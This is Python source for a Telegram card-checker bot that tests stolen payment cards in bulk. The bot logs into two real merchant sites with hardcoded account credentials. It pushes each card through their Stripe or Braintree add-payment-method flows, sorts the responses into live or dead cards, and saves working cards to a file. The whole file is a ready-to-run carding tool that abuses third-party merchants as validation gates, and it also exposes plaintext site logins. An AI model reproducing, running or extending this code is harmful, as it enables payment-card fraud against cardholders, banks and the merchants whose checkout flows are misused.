import os
import re
import time
import json
import asyncio
import base64
from html import unescape
from bs4 import BeautifulSoup

import httpx
from telegram import Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
)

OWNER_ADMIN_ID = 7519839885  # Ganti dengan Telegram user ID Anda (Owner Admin)
ADMIN_ID_FILE = "admin_ids.txt"

def get_admin_chat_ids() -> set[int]:
    if os.path.exists(ADMIN_ID_FILE):
        with open(ADMIN_ID_FILE, "r") as f:
            return {int(line.strip()) for line in f if line.strip().isdigit()}
    return set()

def save_admin_chat_ids(admins: set[int]) -> None:
    with open(ADMIN_ID_FILE, "w") as f:
        for aid in admins:
            f.write(f"{aid}\n")

admin_chat_ids = get_admin_chat_ids()
active_mode_per_chat = {}

class StripeAuth:
    @staticmethod
    def gets(s: str, start: str, end: str) -> str | None:
        try:
            start_index = s.index(start) + len(start)
            end_index = s.index(end, start_index)
            return s[start_index:end_index]
        except ValueError:
            return None

    @staticmethod
    async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> tuple[str, str, str, str]:
        try:
            cc, mes, ano, cvv = fullz.split("|")
            mes = mes.zfill(2)
            if len(ano) == 4:
                ano = ano[-2:]
            current_year = int(time.strftime("%y"))
            current_month = int(time.strftime("%m"))
            expiry_valid = True
            try:
                expiry_month = int(mes)
                expiry_year = int(ano)
                if expiry_month < 1 or expiry_month > 12 or expiry_year < current_year or (expiry_year == current_year and expiry_month < current_month):
                    expiry_valid = False
            except:
                expiry_valid = False

            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': 'en-US,en;q=0.9',
                'Cache-Control': 'max-age=0',
                'Connection': 'keep-alive',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
                'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Linux"',
            }

            response = await session.get('https://elearntsg.com/login/', headers=headers)
            login = StripeAuth.gets(response.text, '"learndash-login-form" value="', '" />')
            if login is None:
                return "Login token not found ", '', '', ''
            headers.update({
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://elearntsg.com',
                'Referer': 'https://elearntsg.com/login/',
            })
            data = {
                'learndash-login-form': login,
                'pmpro_login_form_used': '1',
                'log': 'rensen88@gmail.com',
                'pwd': 'Rensen88',
                'wp-submit': 'Log In',
                'redirect_to': '',
            }
            await session.post('https://elearntsg.com/wp-login.php', headers=headers, data=data)
            await session.get('https://elearntsg.com/activity-feed/', headers=headers)
            await session.get('https://elearntsg.com/my-account/payment-methods/', headers=headers)
            response = await session.get('https://elearntsg.com/my-account/add-payment-method/', headers=headers)
            nonce = StripeAuth.gets(response.text, '"add_card_nonce":"', '"')
            if nonce is None:
                return "Nonce token not found ", '', '', ''

            headers_api = {
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'priority': 'u=1, i',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Linux"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': headers['User-Agent'],
            }
            data_api = {
                'type':'card',
                'billing_details[name]':'rena senoman',
                'billing_details[email]':'rensen89@gmail.com',
                'card[number]': cc,
                'card[cvc]': cvv,
                'card[exp_month]': mes,
                'card[exp_year]': ano,
                'guid':'e449b162-3515-4886-87fa-abb185bba5ef094143',
                'muid':'6a88dcf2-f935-4ff8-a9f6-622d6f9853a8cc8e1c',
                'sid':'e111c2c6-927f-42ce-af16-8c70358cf59a6dea3e',
                'payment_user_agent':'stripe.js/4e21d61aa2; stripe-js-v3/4e21d61aa2; split-card-element',
                'referrer':'https://elearntsg.com',
                'time_on_page':'116734',
                'client_attribution_metadata[client_session_id]':'02c69dec-7a68-4d1c-96eb-00b43ee46be0',
                'client_attribution_metadata[merchant_integration_source]':'elements',
                'client_attribution_metadata[merchant_integration_subtype]':'card-element',
                'client_attribution_metadata[merchant_integration_version]':'2017',
                'key':'pk_live_HIVQRhai9aSM6GSJe9tj2MDm00pcOYKCxs',
            }
            response = await session.post('https://api.stripe.com/v1/payment_methods', headers=headers_api, data=data_api)
            pm_json = response.json()
            try:
                id = pm_json.get('id')
                brand = pm_json.get('card', {}).get('brand', '')
                country = pm_json.get('card', {}).get('country', '')
                card_type = pm_json.get('card', {}).get('funding', '')
            except:
                return response.text, '', '', ''
            error_message = pm_json.get('error', {}).get('message', None)
            if not expiry_valid and error_message is None:
                error_message = "Expiration date invalid "
            if error_message:
                return error_message, country, brand, card_type

            headers_confirm = {
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Accept-Language': 'en-US,en;q=0.9',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': 'https://elearntsg.com',
                'Referer': 'https://elearntsg.com/my-account/add-payment-method/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': headers['User-Agent'],
                'X-Requested-With': 'XMLHttpRequest',
                'sec-ch-ua': headers['sec-ch-ua'],
                'sec-ch-ua-mobile': headers['sec-ch-ua-mobile'],
                'sec-ch-ua-platform': headers['sec-ch-ua-platform'],
            }
            params_confirm = {'wc-ajax': 'wc_stripe_create_setup_intent'}
            data_confirm = {'stripe_source_id': id, 'nonce': nonce}
            response = await session.post('https://elearntsg.com/', params=params_confirm, headers=headers_confirm, data=data_confirm)
            return response.text, country, brand, card_type
        except Exception as e:
            return f"EXCEPTION: {str(e)}", '', '', ''

    @staticmethod
    async def charge_resp(result):
        try:
            if '{"status":"SUCCESS",' in result or '"status":"success"' in result:
                return "Approved ✅"
            elif "Thank you for your donation" in result:
                return "PAYMENT SUCCESSFUL! 🎉"
            elif "insufficient funds" in result:
                return "INSUFFICIENT FUNDS ✅"
            elif "incorrect_cvc" in result or "security code is incorrect" in result:
                return "CVV INCORRECT ❎"
            elif "transaction_not_allowed" in result:
                return "TRANSACTION NOT ALLOWED ❎"
            elif '"cvc_check": "pass"' in result:
                return "CVV MATCH ✅"
            elif "requires_action" in result:
                return "VERIFICATION 🚫"
            elif "three_d_secure_redirect" in result or "card_error_authentication_required" in result:
                return "3DS REQUIRED ❎"
            elif "Your card does not support this type of purchase." in result:
                return "CARD DOESN'T SUPPORT THIS PURCHASE ❎"
            elif "generic_decline" in result:
                return "GENERIC DECLINED ❌"
            elif "do not honor" in result:
                return "DO NOT HONOR ❌"
            elif "fraudulent" in result:
                return "FRAUDULENT ❌"
            elif "invalid cvc" in result:
                return "INVALID CVV ❌"
            elif "stolen card" in result:
                return "STOLEN CARD ❌"
            elif "lost_card" in result:
                return "LOST CARD ❌"
            elif "pickup_card" in result:
                return "PICKUP CARD ❌"
            elif "incorrect_number" in result or "card number is incorrect" in result:
                return "INCORRECT CARD NUMBER ❌"
            elif "Your card has expired." in result:
                return "EXPIRED CARD ❌"
            elif "captcha" in result:
                return "CAPTCHA ❌"
            else:
                with open("result_logs.txt", "a", encoding="utf-8") as f:
                    f.write(result + "\n")
                return result + "❌"
        except Exception as e:
            return f"{str(e)} ❌"

    @staticmethod
    async def multi_checking(fullz: str) -> str:
        start = time.time()
        async with httpx.AsyncClient(timeout=40) as session:
            result, country, brand, card_type = await StripeAuth.create_payment_method(fullz, session)
            response = await StripeAuth.charge_resp(result)
        elapsed = round(time.time() - start, 2)
        try:
            json_resp = json.loads(result)
            if "error" in json_resp:
                error_message = unescape(json_resp["error"].get("message","")).strip()
                output = (f"𝗖𝗮𝗿𝗱: » <code>{fullz}</code>\n"
                          f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆: » 𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛\n"
                          f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: » {error_message} ❌\n"
                          f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: » {country}\n"
                          f"𝗕𝗿𝗮𝗻𝗱: » {brand}\n"
                          f"𝗧𝘆𝗽𝗲: » {card_type}\n"
                          f"𝗧𝗶𝗺𝗲: » {elapsed}s")
                return output
        except:
            pass
        output = (f"𝗖𝗮𝗿𝗱: » <code>{fullz}</code>\n"
                  f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆: » 𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛\n"
                  f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: » {response}\n"
                  f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: » {country}\n"
                  f"𝗕𝗿𝗮𝗻𝗱: » {brand}\n"
                  f"𝗧𝘆𝗽𝗲: » {card_type}\n"
                  f"𝗧𝗶𝗺𝗲: » {elapsed}s")
        if any(k in response for k in ["Approved ✅", "CVV INCORRECT", "CVV MATCH", "INSUFFICIENT FUNDS"]):
            with open("auth.txt", "a", encoding="utf-8") as f:
                f.write(output + "\n")
        return output

    @staticmethod
    async def start_stripe(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        chat_id = update.effective_chat.id
        active_mode_per_chat[chat_id] = 'stripe'
        await update.message.reply_text(
            "𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛\nSEND CARD IN FORMAT » CC|MM|YY|CVV"
        )

    @staticmethod
    async def addadmin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        chat_id = update.effective_chat.id
        if chat_id != OWNER_ADMIN_ID:
            await update.message.reply_text("ONLY OWNER ADMIN CAN ADD ANOTHER ADMIN ❌")
            return
        if not context.args or len(context.args) != 1:
            await update.message.reply_text("/addadmin USER ID")
            return
        try:
            new_admin_id = int(context.args[0])
        except:
            await update.message.reply_text("INVALID USER ID, MUST BE A NUMBER.")
            return
        if new_admin_id in admin_chat_ids:
            await update.message.reply_text(f"USER ID {new_admin_id} IS ALREADY AN ADMIN.")
            return
        admin_chat_ids.add(new_admin_id)
        save_admin_chat_ids(admin_chat_ids)
        await update.message.reply_text(f"USER ID {new_admin_id} HAS BEEN SUCCESSFULLY ADDED AS ADMIN!")

    @staticmethod
    async def deladmin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        chat_id = update.effective_chat.id
        if chat_id != OWNER_ADMIN_ID:
            await update.message.reply_text("ONLY OWNER ADMIN CAN REMOVE AN ADMIN ❌")
            return
        if not context.args or len(context.args) != 1:
            await update.message.reply_text("/deladmin USER ID")
            return
        try:
            remove_admin_id = int(context.args[0])
        except:
            await update.message.reply_text("INVALID USER ID, MUST BE A NUMBER.")
            return
        if remove_admin_id not in admin_chat_ids:
            await update.message.reply_text(f"USER ID {remove_admin_id} IS NOT AN ADMIN.")
            return
        if remove_admin_id == OWNER_ADMIN_ID:
            await update.message.reply_text("YOU CANNOT REMOVE YOURSELF AS OWNER ADMIN ❌")
            return
        admin_chat_ids.remove(remove_admin_id)
        save_admin_chat_ids(admin_chat_ids)
        await update.message.reply_text(f"USER ID {remove_admin_id} HAS BEEN REMOVED FROM ADMINS.")

class BraintreeAuth:
    @staticmethod
    def gets(s: str, start: str, end: str) -> str | None:
        try:
            start_index = s.index(start) + len(start)
            end_index = s.index(end, start_index)
            return s[start_index:end_index]
        except ValueError:
            return None

    @staticmethod
    def extract_braintree_token(response_text):
        pattern = r'wc_braintree_client_token\s*=\s*\["([^"]+)"\]'
        match = re.search(pattern, response_text)
        if not match:
            return None
        token_base64 = match.group(1)
        try:
            decoded_json = base64.b64decode(token_base64).decode('utf-8')
            data = json.loads(decoded_json)
            return data
        except Exception as e:
            print(f"Error decoding or parsing JSON token: {e}")
            return None

    @staticmethod
    async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> tuple[str, str, str, str, str]:
        try:
            cc, mes, ano, cvv = fullz.split("|")
            mes = mes.zfill(2)
            if len(ano) == 4:
                ano = ano[-2:]
            current_year = int(time.strftime("%y"))
            current_month = int(time.strftime("%m"))
            expiry_valid = True
            try:
                expiry_month = int(mes)
                expiry_year = int(ano)
                if expiry_month < 1 or expiry_month > 12 or expiry_year < current_year or (expiry_year == current_year and expiry_month < current_month):
                    expiry_valid = False
            except:
                expiry_valid = False
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'max-age=0',
                'if-modified-since': 'Fri, 29 Aug 2025 04:27:39 GMT',
                'priority': 'u=0, i',
                'referer': 'https://boltlaundry.com/',
                'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Linux"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            }
            response = await session.get('https://boltlaundry.com/loginnow/', headers=headers)
            login = BraintreeAuth.gets(response.text, '<input type="hidden" name="ihc_login_nonce" value="', '"')
            headers.update({
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://boltlaundry.com',
                'referer': 'https://boltlaundry.com/loginnow/',
            })
            data = {
                'ihcaction': 'login',
                'ihc_login_nonce': login,
                'log': 'SiennaMor',
                'pwd': 'SiennaMoran1209',
            }
            await session.post('https://boltlaundry.com/loginnow/', headers=headers, data=data)
            await session.get('https://boltlaundry.com/my-account/', headers=headers)
            await session.get('https://boltlaundry.com/my-account/payment-methods/', headers=headers)
            response = await session.get('https://boltlaundry.com/my-account/add-payment-method/', headers=headers)
            nonce = BraintreeAuth.gets(response.text, '<input type="hidden" id="woocommerce-add-payment-method-nonce" name="woocommerce-add-payment-method-nonce" value="', '"')
            token_data = BraintreeAuth.extract_braintree_token(response.text)
            if token_data is not None:
                authorization_fingerprint = token_data.get('authorizationFingerprint')
            headers_api = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'authorization': f'Bearer {authorization_fingerprint}',
                'braintree-version': '2018-05-10',
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'priority': 'u=1, i',
                'referer': 'https://assets.braintreegateway.com/',
                'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Linux"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            }
            json_data = {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'custom',
                    'sessionId': '1434c429-71ba-4695-b174-a720a6f1fcc6',
                },
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId business consumer purchase corporate } } } }',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': cc,
                            'expirationMonth': mes,
                            'expirationYear': ano,
                            'cvv': cvv,
                            'billingAddress': {
                                'postalCode': '99518',
                                'streetAddress': '3228 Blackwell Street',
                            },
                        },
                        'options': {'validate': False}
                    }
                },
                'operationName': 'TokenizeCreditCard',
            }
            response = await session.post('https://payments.braintree-api.com/graphql', headers=headers_api, json=json_data)
            try:
                token = BraintreeAuth.gets(response.text, '"token":"', '"')
                brand = BraintreeAuth.gets(response.text, '"brandCode":"', '"')
                prepaid = BraintreeAuth.gets(response.text, '"prepaid":"', '"')
                bank = BraintreeAuth.gets(response.text, '"issuingBank":"', '"')
                country = BraintreeAuth.gets(response.text, '"countryOfIssuance":"', '"')
            except:
                return response.text, '', '', '', ''
            error_message = None
            try:
                json_resp = json.loads(response.text)
                if "error" in json_resp:
                    error_message = json_resp["error"].get('message', '')
            except:
                pass
            if not expiry_valid and error_message is None:
                error_message = "Expiration date invalid "
            if error_message:
                return error_message, country, brand, bank, prepaid
            headers_confirm = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://boltlaundry.com',
                'priority': 'u=0, i',
                'referer': 'https://boltlaundry.com/my-account/add-payment-method/',
                'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Linux"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            }
            data_confirm = {
                'payment_method': 'braintree_cc',
                'braintree_cc_nonce_key': token,
                'braintree_cc_device_data': '',
                'braintree_cc_3ds_nonce_key': '',
                'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/63cmb3nwbnpr3f9y/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/63cmb3nwbnpr3f9y"},"merchantId":"63cmb3nwbnpr3f9y","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["Discover","JCB","MasterCard","Visa","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"paypalEnabled":true,"paypal":{"displayName":"Bolt Laundry service","clientId":"ARfb8y-TA8HEUbHMho8toQgfwE5E1QKIBZd6xsRaDVIyIBp0-Q6H2xr8VYa8FU57GUBPOZR__drnQcIe","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"boltlaundryservice_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
                'woocommerce-add-payment-method-nonce': nonce,
                '_wp_http_referer': '/my-account/add-payment-method/',
                'woocommerce_add_payment_method': '1',
            }
            response = await session.post('https://boltlaundry.com/my-account/add-payment-method/', headers=headers_confirm, data=data_confirm, follow_redirects=True)
            return response.text, country, brand, bank, prepaid
        except Exception as e:
            return f"EXCEPTION: {str(e)}", '', '', '', ''

    @staticmethod
    async def charge_resp(result):
        error_message = ""
        response = ""
        try:
            json_resp = json.loads(result)
            if "error" in json_resp and "message" in json_resp["error"]:
                raw_html = unescape(json_resp["error"]["message"])
                soup = BeautifulSoup(raw_html, "html.parser")
                div = soup.find("div", class_="message-container")
                if div:
                    error_message = div.get_text(separator=" ", strip=True)
        except Exception:
            try:
                soup = BeautifulSoup(unescape(result), "html.parser")
                div = soup.find("div", class_="message-container")
                if div:
                    error_message = div.get_text(separator=" ", strip=True)
            except Exception:
                error_message = ""
        if "Reason: " in error_message:
            _, _, after = error_message.partition("Reason: ")
            error_message = after.strip()
        if "Payment method successfully added." in error_message:
            response = "Approved ✅"
            error_message = ""
        if error_message:
            return f"{error_message} ❌"
        if response:
            return response
        try:
            if '{"status":"SUCCESS",' in result or '"status":"success"' in result or 'Payment method successfully added.' in result:
                return "Approved ✅"
            elif "Thank you for your donation" in result:
                return "PAYMENT SUCCESSFUL! 🎉"
            elif "insufficient funds" in result:
                return "INSUFFICIENT FUNDS ✅"
            elif "incorrect_cvc" in result or "security code is incorrect" in result:
                return "CVV INCORRECT ❎"
            elif "transaction_not_allowed" in result:
                return "TRANSACTION NOT ALLOWED ❎"
            elif '"cvc_check": "pass"' in result:
                return "CVV MATCH ✅"
            elif "requires_action" in result:
                return "VERIFICATION 🚫"
            elif "three_d_secure_redirect" in result or "card_error_authentication_required" in result:
                return "3DS REQUIRED ❎"
            elif "Your card does not support this type of purchase." in result:
                return "CARD DOESN'T SUPPORT THIS PURCHASE ❎"
            elif "generic_decline" in result:
                return "GENERIC DECLINED ❌"
            elif "do not honor" in result:
                return "DO NOT HONOR ❌"
            elif "fraudulent" in result:
                return "FRAUDULENT ❌"
            elif "invalid cvc" in result:
                return "INVALID CVV ❌"
            elif "stolen card" in result:
                return "STOLEN CARD ❌"
            elif "lost_card" in result:
                return "LOST CARD ❌"
            elif "pickup_card" in result:
                return "PICKUP CARD ❌"
            elif "incorrect_number" in result or "card number is incorrect" in result:
                return "INCORRECT CARD NUMBER ❌"
            elif "Your card has expired." in result:
                return "EXPIRED CARD ❌"
            elif "captcha" in result:
                return "CAPTCHA ❌"
            else:
                with open("result_logs.txt", "a", encoding="utf-8") as f:
                    f.write(result + "\n")
                return result + "❌"
        except Exception as e:
            return f"{str(e)} ❌"

    @staticmethod
    async def multi_checking(fullz: str) -> str:
        start = time.time()
        async with httpx.AsyncClient(timeout=40) as session:
            result, country, brand, bank, prepaid = await BraintreeAuth.create_payment_method(fullz, session)
            response = await BraintreeAuth.charge_resp(result)
        elapsed = round(time.time() - start, 2)
        error_msg = ""
        try:
            json_resp = json.loads(result)
            if "error" in json_resp and "message" in json_resp["error"]:
                raw_html = unescape(json_resp["error"]["message"])
                soup = BeautifulSoup(raw_html, "html.parser")
                div = soup.find("div", class_="message-container")
                if div:
                    error_msg = div.get_text(separator=" ", strip=True)
        except Exception:
            pass
        if "Reason: " in error_msg:
            _, _, after = error_msg.partition("Reason: ")
            error_msg = after.strip()
        if "Payment method successfully added." in error_msg:
            error_msg = ""
        if error_msg:
            output = (f"𝗖𝗮𝗿𝗱: » <code>{fullz}</code>\n"
                      f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆: » 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛\n"
                      f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: » {error_msg} ❌\n"
                      f"𝗕𝗿𝗮𝗻𝗱: » {brand}\n"
                      f"𝗕𝗮𝗻𝗸: » {bank}\n"
                      f"𝗣𝗿𝗲𝗽𝗮𝗶𝗱: » {prepaid}\n"
                      f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: » {country}\n"
                      f"𝗧𝗶𝗺𝗲: » {elapsed}s")
        else:
            output = (f"𝗖𝗮𝗿𝗱: » <code>{fullz}</code>\n"
                      f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆: » 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛\n"
                      f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: » {response}\n"
                      f"𝗕𝗿𝗮𝗻𝗱: » {brand}\n"
                      f"𝗕𝗮𝗻𝗸: » {bank}\n"
                      f"𝗣𝗿𝗲𝗽𝗮𝗶𝗱: » {prepaid}\n"
                      f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: » {country}\n"
                      f"𝗧𝗶𝗺𝗲: » {elapsed}s")
            if any(k in response for k in ["Approved", "CVV INCORRECT", "CVV MATCH", "INSUFFICIENT FUNDS"]):
                with open("auth.txt", "a") as f:
                    f.write(output + "\n")
        return output

    @staticmethod
    async def start_braintree(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        chat_id = update.effective_chat.id
        active_mode_per_chat[chat_id] = 'braintree'
        await update.message.reply_text(
            "𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛\nSEND CARD IN FORMAT » CC|MM|YY|CVV"
        )

    @staticmethod
    async def addadmin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        chat_id = update.effective_chat.id
        if chat_id != OWNER_ADMIN_ID:
            await update.message.reply_text("ONLY OWNER ADMIN CAN ADD ANOTHER ADMIN ❌")
            return
        if not context.args or len(context.args) != 1:
            await update.message.reply_text("/addadmin USER ID")
            return
        try:
            new_admin_id = int(context.args[0])
        except:
            await update.message.reply_text("INVALID USER ID, MUST BE A NUMBER.")
            return
        if new_admin_id in admin_chat_ids:
            await update.message.reply_text(f"USER ID {new_admin_id} IS ALREADY AN ADMIN.")
            return
        admin_chat_ids.add(new_admin_id)
        save_admin_chat_ids(admin_chat_ids)
        await update.message.reply_text(f"USER ID {new_admin_id} HAS BEEN SUCCESSFULLY ADDED AS ADMIN!")

    @staticmethod
    async def deladmin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        chat_id = update.effective_chat.id
        if chat_id != OWNER_ADMIN_ID:
            await update.message.reply_text("ONLY OWNER ADMIN CAN REMOVE AN ADMIN ❌")
            return
        if not context.args or len(context.args) != 1:
            await update.message.reply_text("/deladmin USER ID")
            return
        try:
            remove_admin_id = int(context.args[0])
        except:
            await update.message.reply_text("INVALID USER ID, MUST BE A NUMBER.")
            return
        if remove_admin_id not in admin_chat_ids:
            await update.message.reply_text(f"USER ID {remove_admin_id} IS NOT AN ADMIN.")
            return
        if remove_admin_id == OWNER_ADMIN_ID:
            await update.message.reply_text("YOU CANNOT REMOVE YOURSELF AS OWNER ADMIN ❌")
            return
        admin_chat_ids.remove(remove_admin_id)
        save_admin_chat_ids(admin_chat_ids)
        await update.message.reply_text(f"USER ID {remove_admin_id} HAS BEEN REMOVED FROM ADMINS.")

async def handle_cc_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    if chat_id not in admin_chat_ids:
        await update.message.reply_text("YOU ARE NOT AUTHORIZED TO USE THIS BOT ❌")
        return

    mode = active_mode_per_chat.get(chat_id, None)
    if mode is None:
        await update.message.reply_text("PLEASE SELECT AUTH METHOD FIRST WITH /sa OR /ba")
        return

    text = update.message.text.strip()
    raw_cards = []
    for line in text.splitlines():
        for part in line.strip().split():
            if part:
                raw_cards.append(part.strip())

    if not raw_cards:
        await update.message.reply_text("NO CARD DATA FOUND IN MESSAGE.")
        return

    msg = await update.message.reply_text("PROCESSING YOUR CARD, PLEASE WAIT...", parse_mode='HTML')

    try:
        for fullz in raw_cards:
            parts = fullz.split("|")
            if len(parts) != 4:
                await update.message.reply_text(
                    f"WRONG FORMAT:\n<code>{fullz}</code>\nUSE FORMAT CC|MM|YY|CVV",
                    parse_mode='HTML'
                )
                continue

            cc_num, month, year, cvv = parts
            if len(year) == 4:
                year = year[-2:]

            cc_formatted = f"{cc_num}|{month}|{year}|{cvv}"

            if mode == 'stripe':
                await asyncio.sleep(3)
                result = await StripeAuth.multi_checking(cc_formatted)
            else:
                await asyncio.sleep(20)
                result = await BraintreeAuth.multi_checking(cc_formatted)

            await update.message.reply_text(result, parse_mode='HTML')

        await msg.delete()

    except Exception as e:
        await update.message.reply_text(f"ERROR: {str(e)}")


if __name__ == "__main__":
    import sys
    application = ApplicationBuilder().token("TOKEN").build()

    application.add_handler(CommandHandler("sa", StripeAuth.start_stripe))
    application.add_handler(CommandHandler("ba", BraintreeAuth.start_braintree))

    application.add_handler(CommandHandler("addadmin_sa", StripeAuth.addadmin))
    application.add_handler(CommandHandler("deladmin_sa", StripeAuth.deladmin))
    application.add_handler(CommandHandler("addadmin_ba", BraintreeAuth.addadmin))
    application.add_handler(CommandHandler("deladmin_ba", BraintreeAuth.deladmin))

    application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_cc_message))

    print("PARAEL CHECKER BOT RUNNING 🔥")

    try:
        application.run_polling()
    except KeyboardInterrupt:
        print("BOT STOPPED BY USER")
        sys.exit()
